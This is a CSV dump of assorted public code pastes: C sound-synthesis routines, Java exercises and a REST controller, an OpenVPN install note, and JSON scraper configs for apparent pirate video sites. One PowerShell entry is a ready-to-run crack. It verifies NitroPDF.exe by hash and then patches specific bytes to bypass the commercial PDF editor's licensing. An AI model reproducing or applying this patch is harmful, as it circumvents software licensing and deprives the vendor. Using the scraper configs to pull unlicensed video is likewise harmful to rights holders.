id,title,username,language,date,content
hfdkNaGJ,ukaelToneC.h,Kaelygon,C,Friday 7th of July 2023 04:56:55 AM CDT,"
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include ""portaudio.h""


//typedef
//fraction (a, b)
typedef struct {
	uint16_t a;
	uint16_t b;
} Frac;

//(data*, size, position)
typedef struct {
	const uint8_t* data;  // Pointer to the raw audio data
	size_t size;      // Size of the audio data in bytes
	size_t position;      // Current position in the audio data
} AudioData;


//Input Output

void writeAudioDataToFile(const char* filename, const AudioData* audio) {
	// Open the file in binary mode for writing
	FILE* file = fopen(filename, ""wb"");
	if (file == NULL) {
		fprintf(stderr, ""Failed to open the file for writing.\n"");
		return;
	}

	// Write the audio data to the file
	size_t bytesWritten = fwrite(audio->data, sizeof(uint8_t), audio->size, file);
	if (bytesWritten != audio->size) {
		fprintf(stderr, ""Failed to write the audio data to the file.\n"");
	}

	// Close the file
	fclose(file);
}


//Tone generation
// Callback function that is called by PortAudio to fill the output buffer
static int audioCallback(
	const void* inputBuffer, 
	void* outputBuffer,
	unsigned long framesPerBuffer,
	const PaStreamCallbackTimeInfo* timeInfo,
	PaStreamCallbackFlags statusFlags, 
	void* userData
){
	AudioData* audioData = (AudioData*)userData;
	uint8_t* out = (uint8_t*)outputBuffer;
	size_t remainingData = audioData->size - audioData->position;
	size_t numFrames = framesPerBuffer;
	
	// If there is not enough audio data remaining, fill the buffer with silence
	if (remainingData < framesPerBuffer) {
		numFrames = remainingData;
		for (size_t i = 0; i < numFrames; i++) {
			out[i] = 128;  // 128 represents silence for unsigned 8-bit audio
		}
	}
	
	// Copy the audio data to the output buffer
	for (size_t i = 0; i < numFrames; i++) {
		out[i] = audioData->data[audioData->position++];
	}
	
	return paContinue;
}


//wave function pointers
//(uint8_t num)
typedef uint8_t (*ukael8)(uint8_t num);
//(uint16_t num)
typedef uint8_t (*ukael16)(uint16_t num);
//(uint8_t num, uint8_t arg1)
typedef uint8_t (*ukaelArgs2)(uint8_t num, uint8_t arg1);

//testing
typedef uint8_t (*ukaelArgs3)(uint16_t num, uint8_t arg1, uint8_t arg2);

//wave pointers wrapper
typedef uint8_t (*ukaelN)(uint32_t num, uint8_t arg1, uint8_t arg2);

// WaveMap (const char* id, func8, func16, args2)
typedef struct {
	const char* id;
	ukael8 func8;
	ukael16 func16;
	ukaelArgs2 args2;
	ukaelArgs3 args3;
} WaveMap;


// WaveMap waveList. List of various function pointers
const WaveMap waveList[] = {
	//(uint8)
	{""sine"", 		ukaelSine					},
	{""csine"", 		ukaelCSine					},
	{""triangle"", 	ukaelTriangle				},
	{""saw"", 		ukaelSaw					},
	{""square"", 		ukaelSquare					},
	{""testing"", 	testing						},

	//(uint16)
	{""noise"", 		NULL, ukaelNoise			},
	{""wnoise"", 		NULL, ukaelWNoise			},

	//(uint8, uint8)
	{""pulse"", 		NULL, NULL, ukaelPulse		},

	//uint16, uint8, uint8
	{""rwalk"", 	NULL, NULL, NULL, ukaelRWalk	}
};


// Number of elements in the mapping table
const size_t waveCount = sizeof(waveList) / sizeof(waveList[0]);

// generate and store waveform to buffer
void generateTone(
	uint8_t* buffer,
	Frac freq,
	uint32_t length,
	uint8_t amplitude,
	const char* waveKey,
	uint8_t arg0,
	uint8_t arg1
) {
	ukaelN waveFunc = NULL;

	// Find the waveform function pointers based on the string identifier
	for (size_t i = 0; i < waveCount; ++i) {
		if (strcmp(waveKey, waveList[i].id) == 0) {

			ukael8 wf8 = waveList[i].func8;
			ukael16 wf16 = waveList[i].func16;
			ukaelArgs2 args2 = waveList[i].args2;
			ukaelArgs3 args3 = waveList[i].args3;

			if (wf8 != NULL) {
				waveFunc = (ukaelN)wf8;
				break;
			}
			if(wf16 != NULL) {
				waveFunc = (ukaelN)wf16;
				break;
			}
			if(args2 != NULL) {
				waveFunc = (ukaelN)args2;
				break;
			}
			if(args3 != NULL) {
				waveFunc = (ukaelN)args3;
				break;
			}

		}
	}

	if(waveFunc==NULL){
		printf(""Invalid key!\n"");
		return;
	}

	//Generate
	uint8_t value;
	for (uint32_t i = 0; i < length; ++i) {
		value = waveFunc(i * freq.a / freq.b,arg0,buffer[i-(i!=0)]); //i mul by Frac and generate
		value = value * amplitude / UINT8_MAX + (UINT8_MAX - amplitude) / 2; // amplitude
		buffer[i] = (uint8_t)value; // store to buffer
	}

	return;
}"
H7bxbU3r,OutputDrinksTree,CR7CR7,Java,Friday 7th of July 2023 04:53:54 AM CDT,"Drinks
  Hot
    Tea
      Green Tea
      Black Tea
    Coffee
      Americano
      Latte
      Cappuccino
  Cold
    Non-Alcoholic
      Cola
      Fanta
      Soda
    Alcoholic
      Wine
      Beer
      Whisky
"
xNXGbZV4,DrinksTreeDsa,CR7CR7,Java,Friday 7th of July 2023 04:52:30 AM CDT,"import java.util.ArrayList;
import java.util.List;

class Drink {
    private String name;
    private List<Drink> children;

    public Drink(String name) {
        this.name = name;
        this.children = new ArrayList<>();
    }

    public void addChild(Drink drink) {
        children.add(drink);
    }

    public String getName() {
        return name;
    }

    public List<Drink> getChildren() {
        return children;
    }
}

public class DrinkHierarchy {
    public static void main(String[] args) {
        // Create the drink hierarchy
        Drink root = new Drink(""Drinks"");

        Drink hot = new Drink(""Hot"");
        Drink cold = new Drink(""Cold"");
        root.addChild(hot);
        root.addChild(cold);

        Drink tea = new Drink(""Tea"");
        Drink coffee = new Drink(""Coffee"");
        hot.addChild(tea);
        hot.addChild(coffee);

        Drink greenTea = new Drink(""Green Tea"");
        Drink blackTea = new Drink(""Black Tea"");
        tea.addChild(greenTea);
        tea.addChild(blackTea);

        Drink americano = new Drink(""Americano"");
        Drink latte = new Drink(""Latte"");
        Drink cappuccino = new Drink(""Cappuccino"");
        coffee.addChild(americano);
        coffee.addChild(latte);
        coffee.addChild(cappuccino);

        Drink nonAlcoholic = new Drink(""Non-Alcoholic"");
        Drink alcoholic = new Drink(""Alcoholic"");
        cold.addChild(nonAlcoholic);
        cold.addChild(alcoholic);

        Drink cola = new Drink(""Cola"");
        Drink fanta = new Drink(""Fanta"");
        Drink soda = new Drink(""Soda"");
        nonAlcoholic.addChild(cola);
        nonAlcoholic.addChild(fanta);
        nonAlcoholic.addChild(soda);

        Drink wine = new Drink(""Wine"");
        Drink beer = new Drink(""Beer"");
        Drink whisky = new Drink(""Whisky"");
        alcoholic.addChild(wine);
        alcoholic.addChild(beer);
        alcoholic.addChild(whisky);

        // Print the drink hierarchy using pre-order traversal
        printDrinkHierarchy(root, 0);
    }

    public static void printDrinkHierarchy(Drink drink, int level) {
        StringBuilder indent = new StringBuilder();
        for (int i = 0; i < level; i++) {
            indent.append(""  "");
        }

        System.out.println(indent + drink.getName());

        for (Drink child : drink.getChildren()) {
            printDrinkHierarchy(child, level + 1);
        }
    }
}
"
Yh3yggcq,ukaelWaceC.h,Kaelygon,C,Friday 7th of July 2023 04:51:19 AM CDT,"//waveform functions
#include <stdint.h>

unsigned long long rdtsc(){
	unsigned int lo,hi;
	__asm__ __volatile__ (""rdtsc"" : ""=a"" (lo), ""=d"" (hi));
	return ((unsigned long long)hi << 32) | lo;
}

uint8_t rdrand(){
		uint32_t num;
		asm volatile(""rdrand %0""  : ""=r"" (num));
    return num;
}

//refresh random seed
unsigned int ENTROPY=2599267487;
void reseed(){
	ENTROPY^=ENTROPY<<9;
	if((ENTROPY&255)==0){
		unsigned int buf;
		__asm__ __volatile__ (""rdtsc"" : ""=a"" (buf));
		ENTROPY<<=17;
		ENTROPY^=buf;
		return;
	}
	ENTROPY^=ENTROPY>>7;
	return;
}


//sine approximation.
uint8_t ukaelSine(uint8_t num) {						//n=floor(n)
	uint8_t secondHalf = (num >> 7);					//s=floor(n%255/128)
	num <<= 1;											//2*n%255
	uint16_t buf = ((uint16_t)(num)<<1) - UINT8_MAX;	//(2*n-255)%65536
	num = (uint8_t)((buf * buf) >> 9);					//(floor(n^2%65536)/512)%255
	num = secondHalf ? num : ~num;						//n = s ? n : 255-n
	return num;
}

//Crunchy Sine
uint8_t ukaelCSine(uint8_t num) {
	uint8_t secondHalf = (num >> 7);
	uint8_t evenQuarter = (num >> 6)==0 || (num >> 6)==2;
	num = evenQuarter ? ~num : num;	//invert even quarters
	num <<= 2;	//2 period saw
	num >>= 16;	//square root. Crunchy precision
	num*=num;	//square
	num >>= 1;	//divide by 2
	num = secondHalf ? num : ~num;	//invert 2nd half
	return num;
}

//triangle
uint8_t ukaelTriangle(uint8_t num) {
	num+=63;
	uint8_t secondHalf = (num >> 7);
	num <<= 1;
	num = secondHalf ? ~num : num;	//invert 2nd half
	return num;
}

//Saw
uint8_t ukaelSaw(uint8_t num){
	num+=127;	//add UINT_MAX/2
	return num;
}

//Square
uint8_t ukaelSquare(uint8_t num){
	num = ( num>>7 ) ? UINT8_MAX : 0; //hi if 0 to 0.5, low if 0.5 to 1.0
	return num ;
}

//Pulse square 2 arguments
uint8_t ukaelPulse(uint8_t num, uint8_t dutyCycle) {
	num = (num >= dutyCycle) ? UINT8_MAX : 0;	//same as square but dutyCycle sets treshold
	return num ;
}


//Time dependent noise
uint8_t ukaelNoise(uint16_t num) {
	num=num*(ENTROPY<<9);
	if(((num&31)==0)){
		reseed();
	}
	num^=ENTROPY>>7;
    return num;
}

//White noise
uint8_t ukaelWNoise(uint16_t num) {
	reseed();
	num*=3083*ENTROPY;
	return num;
}

//random walk
uint8_t ukaelRWalk(uint16_t num, uint8_t arg1, uint8_t arg2) {
	
	uint8_t random = ukaelNoise(num)>>(arg1&6); //(0 to 255) / 3
	uint8_t sign = random&1; //add=0 subtract=1
	random>>=1;
	random=arg2+(1-sign)*random-(sign)*random; //add or subtract random/2 and reuse random as result
	if(sign==1 && random>arg2){ //underflow 
		return 0;
	}
	if(sign==0 && random<arg2){ //overflow
		return 255;
	}
    return random;
}


uint8_t testing(uint16_t num){
	num*=num*.5;
	num*=(ukaelCSine(num)*ukaelCSine(num))<<4;
    return num;
}




/*
//pointy triangle
uint8_t ukaelTesting(uint8_t num, uint8_t arg1, uint8_t arg2) {
	uint8_t secondHalf = (num >> 7);
	uint8_t evenQuarter = (num >> 6)==0 || (num >> 6)==2;
	num = evenQuarter ? ~num : num;	//invert even quarters

	num<<=2;
	float buf = num;
	buf = buf/(buf+UINT8_MAX)*UINT8_MAX;
	num = buf;
	
	num = secondHalf ? num : ~num;	//invert 2nd half
	return num;
}
*/"
4BCMi7D1,UserRestController,nikolstoyneva,Java,Friday 7th of July 2023 04:47:55 AM CDT,"@RestController
@RequestMapping(""/api/users"")
public class UserRestController {
    private final UserService userService;
    private final AuthenticationHelper authenticationHelper;
    private final UserMapper userMapper;
    private final PostMapper postMapper;
    private final CommentMapper commentMapper;

    @Autowired
    public UserRestController(UserService userService, AuthenticationHelper authenticationHelper, UserMapper userMapper, PostMapper postMapper, CommentMapper commentMapper) {
        this.userService = userService;
        this.postMapper = postMapper;
        this.commentMapper = commentMapper;
        this.authenticationHelper = authenticationHelper;
        this.userMapper = userMapper;
    }

    @GetMapping
    public List<UserDtoOut> getAll(@RequestHeader HttpHeaders headers,
                                   @RequestParam(required = false) String firstName,
                                   @RequestParam(required = false) String username,
                                   @RequestParam(required = false) String sortBy,
                                   @RequestParam(required = false) String sortOrder) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userService.getAll(firstName, username, sortBy, sortOrder)
                    .stream()
                    .map(userMapper::toDto)
                    .collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @GetMapping(""/admins"")
    public List<UserDtoOut> getAdmins(@RequestHeader HttpHeaders headers) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userService.getAdmins().stream()
                    .map((userMapper::toDto))
                    .collect(Collectors.toList());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }

    }

    @GetMapping(""/id/{id}"")
    public UserDtoOut getById(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }

    }

    @GetMapping(""/username/{username}"")
    public UserDtoOut getByUsername(@RequestHeader HttpHeaders headers, @PathVariable String username) {
        try {
            authenticationHelper.tryGetUser(headers);
            return userMapper.toDto(userService.getByUsername(username));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }  catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @GetMapping(""/{id}/comments"")
    public List<CommentDtoOut> getUserComments(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            List<Comment> comments = userService.getById(id).getComments().stream().toList();

            if (comments.size() == 0) {
                throw new ResponseStatusException(HttpStatus.NOT_FOUND, ""Comments not found."");
            }

            return comments.stream().map(commentMapper::toDto).collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }
    }

    @GetMapping(""/{id}/posts"")
    public List<PostDtoOut> getUserPosts(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            authenticationHelper.tryGetUser(headers);
            List<Post> posts = userService.getById(id).getPosts().stream().toList();

            if (posts.size() == 0) {
                throw new ResponseStatusException(HttpStatus.NOT_FOUND, ""Posts not found."");
            }

            return posts.stream().map(postMapper::objectToDto).collect(Collectors.toList());
        } catch (AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        }
    }

    @PostMapping
    public UserDtoOut create(@Valid @RequestBody UserDtoIn userDtoIn) {
        try {
            User user = userMapper.fromDto(userDtoIn);
            userService.create(user);
            return userMapper.toDto(user);
        } catch (DuplicateEntityException e) {
            throw new ResponseStatusException(HttpStatus.CONFLICT, e.getMessage());
        }
    }

    @PutMapping(""/update"")
    public UserDtoOut update(@RequestHeader HttpHeaders headers, @Valid @RequestBody UserDtoIn userDtoCreate) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            User update = userMapper.fromDto(loggedUser.getId(), userDtoCreate);
            userService.update(loggedUser, update);
            return userMapper.toDto(update);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (DuplicateEntityException e) {
            throw new ResponseStatusException(HttpStatus.CONFLICT, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/admin/{id}"")
    public UserDtoOut makeAdmin(@RequestHeader HttpHeaders headers, @PathVariable int id,  @RequestBody(required = false) String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.makeAdmin(id, loggedUser, phoneNumber);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/admin/{id}/reject"")
    public UserDtoOut makeRegularUser(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.makeRegularUser(id, loggedUser);
            return userMapper.toDto(userService.getById(id));
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PostMapping(""/phone-number"")
    public void createPhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);
            userService.createPhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @PutMapping(""/phone-number"")
    public void updatePhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);

            userService.updatePhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @DeleteMapping(""/phone-number"")
    public void deletePhoneNumber(@RequestHeader HttpHeaders headers, @RequestBody String phoneNumber) {
        try {
            User loggedUser = authenticationHelper.tryGetUser(headers);

            userService.deletePhoneNumber(loggedUser, phoneNumber);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }

    @DeleteMapping(""/{id}"")
    public void delete(@RequestHeader HttpHeaders headers, @PathVariable int id) {
        try {
            User user = authenticationHelper.tryGetUser(headers);
            userService.delete(id, user);
        } catch (EntityNotFoundException e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, e.getMessage());
        } catch (UnauthorizedOperationException | AuthorizationException e) {
            throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, e.getMessage());
        }
    }
}
"
cJ0kB3Rf,NPDFPEnt145011x86Fix,cigcag,PowerShell,Friday 7th of July 2023 03:54:48 AM CDT,"<#----------------------------------------------------------------------------------------------
Company : Nitro Software, Inc.
Product : Nitro PDF Pro
Edition : Enterprise
Language: English
Version : 14.5.0.11
File    : NitroPDF.exe
Arch    : 32-bit
FileVer : 14.5.0.11
CRC32   : BB754EC3
MD5     : 21F8E71A3C61E31229A8CC8B3D99C854
SHA-1   : E37263F0BE6ED47662B4C704FBB0FA435285C51F
SHA256  : 5A39B741A71D7534D87B087B8564F730565026BB2175593814324B3AAD6FED5B
Download: https://downloads.gonitro.com/professional_14.5.0.11/en/enterprise/nitro_pro14_x86.msi
----------------------------------------------------------------------------------------------#>
$hashSrc = ('5A39B741A71D7534D87B087B8564F730565026BB2175593814324B3AAD6FED5B')
$hashCmp = Get-FileHash 'NitroPDF.exe' -Algorithm SHA256
If ($hashSrc -ne $hashCmp.Hash)
    {
      CLS
      Write-Output 'Checksum of NitroPDF.exe is wrong';
      Read-Host 'Press Enter to exit script...'; break
    } else  {
        Copy-Item -Path 'NitroPDF.exe' -Destination 'NitroPDF.exe.bak';
        $bytes = [System.IO.File]::ReadAllBytes((get-location).path+'\NitroPDF.exe')
        $bytes[0x1C14EB] = 0x01
        $bytes[0x1C14F9] = 0xFF
        $bytes[0x1C14FA] = 0xC0
        $bytes[0x1C14FB] = 0xC3
        $bytes[0x1C16E0] = 0xB0
        $bytes[0x1C16E1] = 0x01
        $bytes = [System.IO.File]::WriteAllBytes((get-location).path+'\NitroPDF.exe',$bytes)
        CLS
        Write-Output 'NitroPDF.exe is successfully patched';
        Read-Host 'Press Enter to exit script...'; break
            }
"
TtYY83tB,huanyuxing,Damonwei,JSON,Friday 7th of July 2023 03:54:04 AM CDT,"{
""author"":""Dwei-0706"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://www.huanyuxing.com/"",
""cateManual"": {""电视剧"": ""id-b"",""电影"": ""id-a"",""动漫"": ""id-c"",""综艺"": ""id-d""},
""homeVodNode"": ""//div[@class='packcover']/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/div/@data-original"",
""homeVodImgR"": """",
""homeVodMark"": ""/span/text()"",
""cateUrl"": ""https://www.huanyuxing.com/s/{cateId}/page/{catePg}.html"",
""cateVodNode"": ""//div[@class='packcover']/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/div/@data-original"",
""cateVodImgR"": """",
""cateVodMark"": ""/span/text()"",
""dtUrl"":""https://www.huanyuxing.com{vid}"",
""dtNode"": ""//body"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='detailpic l']/img/@src"",
""dtImgR"": ""\\S+(http\\S+)"",
""dtCate"": ""concat(//div[@class='detailinfo r']/p[2]/a/text())"",
""dtCateR"": """",
""dtYear"": ""//div[@class='detailinfo r']/p[3]/a/text()"",
""dtYearR"": """",
""dtArea"": ""//div[@class='detailinfo r']/p[7]/text()"",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtDirector"": ""concat(//div[@class='detailinfo r']/p[4]/a/text())"",
""dtDirectorR"": """",
""dtActor"": ""concat(//div[@class='detailinfo r']/p[5]/a/text())"",
""dtActorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，若线路存在广告请勿相信！！简介：',//div[@class='uibox']/div/text())"",
""dtFromNode"": ""//ul[contains(@id,'down')]/li"",
""dtFromName"":  ""concat('迅雷资源')"",
""dtFromNameR"": """",
""dtUrlNode"": ""//div[contains(@id,'downlist')]"",
""dtUrlSubNode"": ""/div/p"",
""dtUrlId"": ""/a/@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":"""",
""searchUrl"":""https://www.huanyuxing.com/c.html?wd={wd}"",
""scVodNode"":""//div[@class='search']"",
""scVodName"":""/h3/a/@title"",
""scVodId"":""/h3/a/@href"",
""scVodImg"":""/div//img/@src"",
""scVodImgR"":"""",
""scVodMark"":""/div/div[2]/div[1]/span[2]/text()""
}"
CVhzsdJX,openvpn,kyoryo,Bash,Friday 7th of July 2023 03:44:32 AM CDT,"# Open VPN installer
# check https://github.com/angristan/openvpn-install

curl -O https://raw.githubusercontent.com/angristan/openvpn-install/master/openvpn-install.sh
chmod +x openvpn-install.sh

# add new user through this
sudo su
./openvpn-install.sh
# use password
# this will generate <client_name>.ovpn
# copy this to client
"
hmW127H3,longest shortest word ez1,shivamisone,Java,Friday 7th of July 2023 02:46:32 AM CDT,"import java.util.*;
public class breh{
    public static void main(){
        Scanner sc= new Scanner(System.in);
        String k = sc.nextLine();
        k = k+"" "";
        int j =0;
        String[] ar = new String[k.length()];
        int[] ar1 = new int[k.length()];
        String word = """";
        for(int i =0;i<k.length();i++){
            word =word+k.charAt(i);
            if(k.charAt(i) == ' '){
                ar[j] = word;
                ar1[j] = word.length();
                word = """";
                j++;
            }
        }
        String[] ar2 = ar.clone();
        System.out.println(""longest:""+Arrays.toString(ar));
        System.out.println(""longest:""+Arrays.toString(ar1));
        for(int b =0;b<ar.length;b++){
            for(int i =0; i<k.length()-1;i++){
                if(ar1[i+1]>ar1[i]){
                    int t = ar1[i];
                    ar1[i] = ar1[i+1];
                    ar1[i+1] = t;
                    String tt = ar[i];
                    ar[i] = ar[i+1];
                    ar[i+1] = tt;
                }
            }
        }
        System.out.println(""smallest:""+ar[j-1]);
        System.out.println(""longest:""+ar[0]);
        for(int i =0; i<=j;i++){
            if(ar2[i] == ar[0]){
                for(int l = ar[0].length()-1;l>=0;l--){
                    System.out.print(ar[0].charAt(l));
                }
                System.out.print("" "");
                continue;
            }
            else if(ar2[i] == ar[j-1]){
                for(int l = ar[j-1].length()-1;l>=0;l--){
                    System.out.print(ar[0].charAt(l));
                }
                System.out.print("" "");
                continue;
            }
            System.out.print(ar2[i]);
        }
    }
}"
iqQdp253,xi1,Damonwei,JSON,Friday 7th of July 2023 02:40:33 AM CDT,"{
""author"":""Dwei-0706"",
""ua"": ""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36"",
""homeUrl"": ""https://xi1.tv/"",
""cateManual"": {""电视剧"": ""TVshowX"",""电影"": ""FilmX"",""动漫"": ""AnimeX"",""综艺"": ""VarietyX"",""赛事"": ""tiyuX""},
""homeVodNode"": ""//ul[contains(@class,'hl-vod-list hl-wide-list')]/li/a"",
""homeVodName"": ""/@title"",
""homeVodId"": ""/@href"",
""homeVodIdR"": """",
""homeVodImg"": ""/@data-original"",
""homeVodImgR"": """",
""homeVodMark"": ""/div[3]/span/text()"",
""cateUrl"": ""https://xi1.tv/tvshow/{cateId}XXXXXXX{catePg}XXX.html"",
""cateVodNode"": ""//ul[contains(@class,'hl-vod-list hl-wide-list')]/li/a"",
""cateVodName"": ""/@title"",
""cateVodId"": ""/@href"",
""cateVodIdR"": """",
""cateVodImg"": ""/@data-original"",
""cateVodImgR"": """",
""cateVodMark"": ""/div[3]/span/text()"",
""dtUrl"":""https://xi1.tv{vid}"",
""dtNode"": ""//div[@id='conch-content']"",
""dtName"": ""//h1/text()"",
""dtNameR"": """",
""dtImg"": ""//div[@class='hl-dc-pic']/span/@data-original"",
""dtImgR"": ""\\S+(http\\S+)"",
""dtCate"": ""concat(//div[@class='hl-data-xs hl-text-muted']/a//text())"",
""dtCateR"": """",
""dtYear"": """",
""dtYearR"": """",
""dtArea"": """",
""dtAreaR"": """",
""dtMark"": """",
""dtMarkR"": """",
""dtDirector"": ""concat(//li[@class='hl-col-xs-12'][3]/a/text())"",
""dtDirectorR"": """",
""dtActor"": ""concat(//li[@class='hl-col-xs-12'][2]/a/text())"",
""dtActorR"": """",
""dtDesc"": ""concat('Dwei观影提示：资源播放失败可切换不同线路或点击快速搜索其他站点观看，若线路存在广告请勿相信！！简介：',//li[@class='hl-col-xs-12 blurb']/text())"",
""dtFromNode"": ""//div[contains(@class,'hl-plays-from')]/a"",
""dtFromName"":  ""/text()"",
""dtFromNameR"": """",
""dtUrlNode"": ""//ul[contains(@id,'hl-plays-list')]"",
""dtUrlSubNode"": ""/li/a"",
""dtUrlId"": ""/@href"",
""dtUrlIdR"": """",
""dtUrlName"": ""/text()"",
""dtUrlNameR"": """",
""playUrl"":""https://xi1.tv{playUrl}"",
""searchUrl"":""https://xi1.tv/tvsearch/XXXXXXXXXXXXX.html?wd={wd}&submit="",
""scVodNode"":""//div[contains(@class,'hl-item-pic')]/a"",
""scVodName"":""/@title"",
""scVodId"":""/@href"",
""scVodImg"":""/@data-original"",
""scVodImgR"":"""",
""scVodMark"":""/div[3]/span/text()""
}"
